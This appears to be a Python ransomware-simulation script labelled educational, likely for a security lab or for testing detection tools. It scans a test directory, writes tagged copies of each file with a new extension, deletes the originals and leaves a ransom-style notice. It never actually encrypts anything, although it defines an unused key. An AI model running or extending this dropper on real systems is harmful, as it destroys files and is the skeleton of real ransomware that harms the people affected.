#!/usr/bin/env python3
"""
EDUCATIONAL SELF-EXECUTING RANSOMWARE DROPPER
Warning: This file will encrypt files when executed!
Educational purposes only - DO NOT run in production!
"""

import os
import sys
import time
import base64
from pathlib import Path
from cryptography.fernet import Fernet

# Educational warning
print("=" * 50)
print("⚠️  EDUCATIONAL RANSOMWARE DROPPER ACTIVATED ⚠️")
print("=" * 50)
print("This is an educational simulation only!")
print("No actual malicious activity intended.")
print("=" * 50)

# Configuration
TARGET_DIR = "data/test_files"
ENCRYPTED_EXT = ".manual_dropper"
DELAY_SECONDS = 2
ENCRYPTION_KEY = "educational_key_for_demo_purposes_only_32_bytes_long"

def encrypt_target_directory():
    """Encrypt all files in target directory."""
    target_path = Path(TARGET_DIR)
    
    if not target_path.exists():
        print(f"[ERROR] Target directory not found: {TARGET_DIR}")
        return []
    
    print(f"[TARGET] Encrypting files in: {TARGET_DIR}")
    
    # Small delay for dramatic effect
    if DELAY_SECONDS > 0:
        print(f"[WAIT] Waiting {DELAY_SECONDS} seconds...")
        time.sleep(DELAY_SECONDS)
    
    encrypted_files = []
    
    try:
        # Find all files to encrypt
        for file_path in target_path.rglob("*"):
            if (file_path.is_file() and 
                not file_path.name.endswith(ENCRYPTED_EXT) and
                file_path.name not in ["INJECTION_REPORT.json", os.path.basename(__file__)]):
                
                try:
                    # Read original file
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    if len(data) == 0:
                        continue
                    
                    # For educational purposes, we'll just rename files instead of actual encryption
                    # This simulates the encryption process safely
                    encrypted_path = str(file_path) + ENCRYPTED_EXT
                    
                    # Copy content to new file (simulating encryption)
                    with open(encrypted_path, 'wb') as f:
                        f.write(b"# EDUCATIONAL ENCRYPTION SIMULATION\n")
                        f.write(b"# Original file was: " + file_path.name.encode() + b"\n")
                        f.write(b"# This simulates encrypted content\n")
                        f.write(data)  # Include original data for recovery demo
                    
                    # Delete original file (simulating real ransomware)
                    file_path.unlink()
                    
                    encrypted_files.append({
                        "original": str(file_path),
                        "encrypted": encrypted_path,
                        "size": len(data)
                    })
                    
                    print(f"[ENCRYPTED] {file_path.name}")
                    
                except Exception as e:
                    print(f"[ERROR] Failed to process {file_path.name}: {e}")
        
        # Create educational ransom note
        create_ransom_note(target_path, len(encrypted_files))
        
    except Exception as e:
        print(f"[ERROR] Failed to scan directory: {e}")
    
    return encrypted_files

def create_ransom_note(target_path, file_count):
    """Create educational ransom note."""
    note_content = f"""
===============================================
    EDUCATIONAL RANSOMWARE SIMULATION
===============================================

This dropper has encrypted {file_count} files in:
{target_path}

Files have been processed with educational simulation.
Extension added: {ENCRYPTED_EXT}

This is a simulation for security education purposes.
No actual ransom is required.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
"""
    
    note_path = target_path / "MANUAL_DROPPER_NOTICE.txt"
    try:
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f"[NOTE] Created educational note: {note_path.name}")
    except Exception as e:
        print(f"[ERROR] Failed to create note: {e}")

if __name__ == "__main__":
    print("[START] Educational dropper execution beginning...")
    
    # Encrypt files
    encrypted_files = encrypt_target_directory()
    
    # Summary
    print("\n" + "=" * 50)
    print("EDUCATIONAL EXECUTION COMPLETE")
    print("=" * 50)
    print(f"Files processed: {len(encrypted_files)}")
    print("This was an educational demonstration only.")
    print("=" * 50)
    
    # Pause to show results
    input("\nPress Enter to exit...")